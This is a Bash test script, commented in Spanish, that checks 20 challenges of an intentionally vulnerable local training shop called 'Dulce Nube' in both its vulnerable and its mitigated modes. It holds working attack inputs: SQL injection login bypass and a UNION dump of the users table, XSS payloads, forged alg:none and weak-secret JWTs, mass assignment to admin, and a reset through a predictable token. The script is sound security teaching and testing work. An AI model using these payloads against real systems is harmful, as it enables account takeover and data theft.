#!/usr/bin/env bash
# Verifica los 20 retos del lab Dulce Nube en ambos modos.
set -u
BASE="${BASE:-http://127.0.0.1:3009}"
OV="X-Vulnerability-Override"
PASS=0; FAIL=0

code()  { curl -sS -o /dev/null -w "%{http_code}" "$@"; }
body()  { curl -sS "$@"; }
token_of() {
  body -X POST $BASE/api/auth/login -H "Content-Type: application/json" \
    -d "{\"email\":\"$1\",\"password\":\"$2\"}" | jq -r '.token // empty'
}
make_weak_jwt() {
  local h p s
  h=$(printf '%s' '{"alg":"HS256","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
  p=$(printf '%s' '{"id":1,"role":"admin"}'     | base64 -w0 | tr '+/' '-_' | tr -d '=')
  s=$(printf '%s' "$h.$p" | openssl dgst -sha256 -hmac "secret" -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
  printf '%s.%s.%s' "$h" "$p" "$s"
}
assert() {
  local desc="$1" expected="$2" actual="$3"
  if [ "$expected" = "$actual" ]; then
    printf "  ✅ %s\n" "$desc"; PASS=$((PASS+1))
  else
    printf "  ❌ %s\n     esperado: %s\n     obtenido: %s\n" "$desc" "$expected" "$actual"; FAIL=$((FAIL+1))
  fi
}

echo ""
echo "═══════════════════════════════════════════"
echo "  Dulce Nube — Verificación de los 20 retos"
echo "═══════════════════════════════════════════"

if [ "${SKIP_RESET:-0}" != "1" ]; then
  SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
  echo ""
  echo "▶ Recreando BD para estado determinista"
  (cd "$SCRIPT_DIR/.." && npm run reset) > /dev/null 2>&1 || true
  sleep 0.5
fi

echo ""
echo "▶ Pre-flight"
assert "health OK" "ok" "$(body $BASE/api/health | jq -r .status)"
assert "catálogo = 12" "12" "$(body $BASE/api/products | jq '.items | length')"
echo "  ℹ️  usuarios en BD: $(body $BASE/api/admin/users | jq '.items | length')"

T_MARIA=$(token_of "maria@example.com" "maria123")

# ───── 💉 INJECTION ─────
echo ""
echo "▶ 💉 INJECTION"

assert "I1 vulnerable: admin" "admin@dulcenube.com" \
  "$(body -X POST $BASE/api/auth/login -H 'Content-Type: application/json' \
    -d '{"email":"admin@dulcenube.com'"'"' --","password":"x"}' | jq -r '.user.email')"
assert "I1 mitigado: 401" "401" \
  "$(code -X POST $BASE/api/auth/login -H 'Content-Type: application/json' -H "$OV: SQLI_LOGIN=false" \
    -d '{"email":"admin@dulcenube.com'"'"' --","password":"x"}')"

assert "I2 vulnerable: 12" "12" \
  "$(curl -sS -G --data-urlencode "q=' OR 1=1 --" $BASE/api/products | jq '.items | length')"
assert "I2 mitigado: 0" "0" \
  "$(curl -sS -G --data-urlencode "q=' OR 1=1 --" -H "$OV: SQLI_SEARCH=false" $BASE/api/products | jq '.items | length')"

UNION="Postres' UNION SELECT id,email,password,role,name,'',0,0,'','' FROM users --"
N=$(curl -sS -G --data-urlencode "category=$UNION" $BASE/api/products | jq '.items | length')
assert "I3 vulnerable: >= 5 (got $N)" "true" "$([ "$N" -ge 5 ] && echo true)"
assert "I3 mitigado: 0" "0" \
  "$(curl -sS -G --data-urlencode "category=$UNION" -H "$OV: UNION_SQLI_DUMP=false" $BASE/api/products | jq '.items | length')"

assert "I4 vulnerable: crudo" "true" \
  "$(curl -sS -G --data-urlencode "q=<svg onload=alert(1)>" $BASE/api/products \
    | jq -r '.searchInfo.rendered | contains("<svg")')"
assert "I4 mitigado: escapado" "false" \
  "$(curl -sS -G --data-urlencode "q=<svg onload=alert(1)>" -H "$OV: XSS_REFLECTED_SEARCH=false" \
    $BASE/api/products | jq -r '.searchInfo.rendered | contains("<svg")')"

body -X POST $BASE/api/contact -H "Content-Type: application/json" \
  -d '{"name":"Eve","email":"e@e.lab","subject":"x","message":"<img src=x onerror=alert(1)>"}' > /dev/null
assert "I5 vulnerable: crudo" "true" \
  "$(body $BASE/api/contact | jq -r '.items[0].message | contains("<img")')"
assert "I5 mitigado: escapado" "false" \
  "$(body $BASE/api/contact -H "$OV: XSS_STORED_CONTACT=false" | jq -r '.items[0].message | contains("<img")')"

# ───── 🔐 CRYPTO ─────
echo ""
echo "▶ 🔐 CRYPTOGRAPHIC FAILURES"

body -X POST $BASE/api/auth/register -H "Content-Type: application/json" \
  -d '{"name":"T1","email":"t1@test.lab","password":"MiClave"}' > /dev/null
assert "C1 vulnerable: texto plano" "MiClave" \
  "$(body $BASE/api/admin/users | jq -r '.items[] | select(.email=="t1@test.lab") | .password')"

body -X POST $BASE/api/auth/register -H "Content-Type: application/json" -H "$OV: PLAINTEXT_PASSWORDS=false" \
  -d '{"name":"T2","email":"t2@test.lab","password":"MiClave"}' > /dev/null
assert "C1 mitigado: bcrypt" "true" \
  "$(body $BASE/api/admin/users | jq -r '.items[] | select(.email=="t2@test.lab") | .password | startswith("$2")')"

assert "C2: admin es MD5" "true" \
  "$(body $BASE/api/admin/users | jq -r '.items[] | select(.email=="admin@dulcenube.com") | .password | test("^[a-f0-9]{32}$")')"

body -X POST $BASE/api/auth/register -H "Content-Type: application/json" \
  -d '{"name":"C3","email":"c3-target@test.lab","password":"Original123"}' > /dev/null
EXPECTED=$(printf '%s' 'c3-target@test.lab' | md5sum | awk '{print $1}')
assert "C3 vulnerable: md5(email)" "$EXPECTED" \
  "$(body -X POST $BASE/api/auth/forgot -H "Content-Type: application/json" \
    -d '{"email":"c3-target@test.lab"}' | jq -r '._debug_token')"
TK=$(body -X POST $BASE/api/auth/forgot -H "Content-Type: application/json" \
  -d '{"email":"c3-target@test.lab"}' | jq -r '._debug_token')
assert "C3: reset con token" "200" \
  "$(code -X POST $BASE/api/auth/reset-password -H "Content-Type: application/json" \
    -d "{\"token\":\"$TK\",\"newPassword\":\"Pwned123\"}")"
assert "C3 mitigado: sin debug" "false" \
  "$(body -X POST $BASE/api/auth/forgot -H "Content-Type: application/json" -H "$OV: PREDICTABLE_RESET_TOKEN=false" \
    -d '{"email":"c3-target@test.lab"}' | jq 'has("_debug_token")')"

ORDER_V=$(body -X POST $BASE/api/orders -H "Content-Type: application/json" \
  -H "Authorization: Bearer $T_MARIA" \
  -d '{"customer":{"name":"C4v","address":"x","phone":"x"},"items":[{"productId":1,"price":25,"quantity":1}],"paymentMethod":"x"}')
assert "C4 vulnerable: no aes:" "false" \
  "$(echo "$ORDER_V" | jq -r '.customer_encrypted | startswith("aes:")')"
assert "C4 vulnerable: base64 → C4v" "C4v" \
  "$(echo "$ORDER_V" | jq -r '.customer_encrypted' | base64 -d 2>/dev/null | jq -r '.name')"

ORDER_M=$(body -X POST $BASE/api/orders -H "Content-Type: application/json" \
  -H "Authorization: Bearer $T_MARIA" -H "$OV: BASE64_FAKE_ENCRYPTION=false" \
  -d '{"customer":{"name":"C4m","address":"x","phone":"x"},"items":[{"productId":1,"price":25,"quantity":1}],"paymentMethod":"x"}')
assert "C4 mitigado: aes:" "true" \
  "$(echo "$ORDER_M" | jq -r '.customer_encrypted | startswith("aes:")')"

assert "C5 vulnerable: clave" "dulce-nube-master-key-2024-DO-NOT-USE-IN-PROD" \
  "$(body $BASE/api/health | jq -r '.crypto.key')"
assert "C5 mitigado: null" "null" \
  "$(body $BASE/api/health -H "$OV: HARDCODED_CRYPTO_SECRET=false" | jq -r '.crypto')"

# ───── 🚪 BROKEN ACCESS CONTROL ─────
echo ""
echo "▶ 🚪 BROKEN ACCESS CONTROL"

assert "B1 vulnerable: maria ve pedro" "Pedro Ruiz" \
  "$(body $BASE/api/orders/2 -H "Authorization: Bearer $T_MARIA" | jq -r '.customer.name')"
assert "B1 mitigado: 403" "403" \
  "$(code $BASE/api/orders/2 -H "Authorization: Bearer $T_MARIA" -H "$OV: IDOR_ORDERS=false")"

assert "B2 vulnerable: admin sin token" "admin@dulcenube.com" \
  "$(body $BASE/api/me | jq -r '.user.email')"
assert "B2 mitigado: 401" "401" "$(code $BASE/api/me -H "$OV: MISSING_AUTH_ME=false")"

assert "B3 vulnerable: .env" "200" "$(code $BASE/.env)"
assert "B3 mitigado: 403" "403" "$(code $BASE/.env -H "$OV: EXPOSED_SENSITIVE_FILES=false")"

assert "B4 vulnerable: users" "true" \
  "$(body $BASE/api/admin/users -H "Authorization: Bearer $T_MARIA" | jq '.items | length > 0')"
assert "B4 mitigado: 403" "403" \
  "$(code $BASE/api/admin/users -H "Authorization: Bearer $T_MARIA" -H "$OV: MISSING_ROLE_CHECK_ADMIN=false")"

assert "B5 vulnerable: admin" "admin" \
  "$(body -X POST $BASE/api/auth/register -H "Content-Type: application/json" \
    -d '{"name":"M","email":"b5v@test.lab","password":"x","role":"admin"}' | jq -r '.user.role')"
assert "B5 mitigado: customer" "customer" \
  "$(body -X POST $BASE/api/auth/register -H "Content-Type: application/json" -H "$OV: MASS_ASSIGNMENT_REGISTER=false" \
    -d '{"name":"M","email":"b5m@test.lab","password":"x","role":"admin"}' | jq -r '.user.role')"

# ───── 🔑 AUTHENTICATION ─────
echo ""
echo "▶ 🔑 AUTHENTICATION FAILURES"

NONE_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwicm9sZSI6ImFkbWluIn0."
assert "A1 vulnerable: alg:none" "admin" \
  "$(body $BASE/api/me -H "Authorization: Bearer $NONE_TOKEN" | jq -r '.user.role')"
assert "A1 mitigado: 401" "401" \
  "$(code $BASE/api/me -H "Authorization: Bearer $NONE_TOKEN" -H "$OV: JWT_ALG_NONE=false")"

WEAK_TOKEN=$(make_weak_jwt)
assert "A2 vulnerable: aceptado" "admin@dulcenube.com" \
  "$(body $BASE/api/me -H "Authorization: Bearer $WEAK_TOKEN" | jq -r '.user.email')"
assert "A2 mitigado: 401" "401" \
  "$(code $BASE/api/me -H "Authorization: Bearer $WEAK_TOKEN" -H "$OV: JWT_WEAK_SECRET=false")"

T_V=$(token_of "maria@example.com" "maria123")
assert "A3 vulnerable: sin exp" "false" \
  "$(echo $T_V | cut -d. -f2 | base64 -d 2>/dev/null | jq 'has("exp")')"
T_S=$(body -X POST $BASE/api/auth/login -H "Content-Type: application/json" -H "$OV: JWT_NO_EXPIRY=false" \
  -d '{"email":"maria@example.com","password":"maria123"}' | jq -r '.token')
assert "A3 mitigado: con exp" "true" \
  "$(echo $T_S | cut -d. -f2 | base64 -d 2>/dev/null | jq 'has("exp")')"

MSG_V1=$(body -X POST $BASE/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"admin@dulcenube.com","password":"x"}' | jq -r '.message')
MSG_V2=$(body -X POST $BASE/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"nadie@nada.lab","password":"x"}' | jq -r '.message')
assert "A4 vulnerable: distintos" "true" "$([ "$MSG_V1" != "$MSG_V2" ] && echo true)"

MSG_S1=$(body -X POST $BASE/api/auth/login -H 'Content-Type: application/json' -H "$OV: USER_ENUMERATION=false" \
  -d '{"email":"admin@dulcenube.com","password":"x"}' | jq -r '.message')
MSG_S2=$(body -X POST $BASE/api/auth/login -H 'Content-Type: application/json' -H "$OV: USER_ENUMERATION=false" \
  -d '{"email":"nadie@nada.lab","password":"x"}' | jq -r '.message')
assert "A4 mitigado: mismo" "true" "$([ "$MSG_S1" = "$MSG_S2" ] && echo true)"

MSG_I1_OFF_V1=$(body -X POST $BASE/api/auth/login -H 'Content-Type: application/json' \
  -H "$OV: SQLI_LOGIN=false,USER_ENUMERATION=true" \
  -d '{"email":"admin@dulcenube.com","password":"x"}' | jq -r '.message')
MSG_I1_OFF_V2=$(body -X POST $BASE/api/auth/login -H 'Content-Type: application/json' \
  -H "$OV: SQLI_LOGIN=false,USER_ENUMERATION=true" \
  -d '{"email":"nadie@nada.lab","password":"x"}' | jq -r '.message')
assert "A4 vulnerable independent from I1" "true" \
  "$([ "$MSG_I1_OFF_V1" != "$MSG_I1_OFF_V2" ] && echo true)"

MSG_I1_OFF_S1=$(body -X POST $BASE/api/auth/login -H 'Content-Type: application/json' \
  -H "$OV: SQLI_LOGIN=false,USER_ENUMERATION=false" \
  -d '{"email":"admin@dulcenube.com","password":"x"}' | jq -r '.message')
MSG_I1_OFF_S2=$(body -X POST $BASE/api/auth/login -H 'Content-Type: application/json' \
  -H "$OV: SQLI_LOGIN=false,USER_ENUMERATION=false" \
  -d '{"email":"nadie@nada.lab","password":"x"}' | jq -r '.message')
assert "A4 mitigado independent from I1" "Credenciales inválidas" \
  "$MSG_I1_OFF_S1"
assert "A4 mitigado independent from I1 (unknown user)" "Credenciales inválidas" \
  "$MSG_I1_OFF_S2"

assert "A5 vulnerable: acepta '1'" "201" \
  "$(code -X POST $BASE/api/auth/register -H 'Content-Type: application/json' \
    -d '{"name":"W","email":"wv@test.lab","password":"1"}')"
assert "A5 mitigado: 400" "400" \
  "$(code -X POST $BASE/api/auth/register -H 'Content-Type: application/json' -H "$OV: WEAK_PASSWORD_NO_RATELIMIT=false" \
    -d '{"name":"W2","email":"wm@test.lab","password":"1"}')"

echo ""
echo "═══════════════════════════════════════════"
echo "  Resultado: $PASS OK, $FAIL fallos"
echo "═══════════════════════════════════════════"
echo ""
[ "$FAIL" -eq 0 ] && exit 0 || exit 1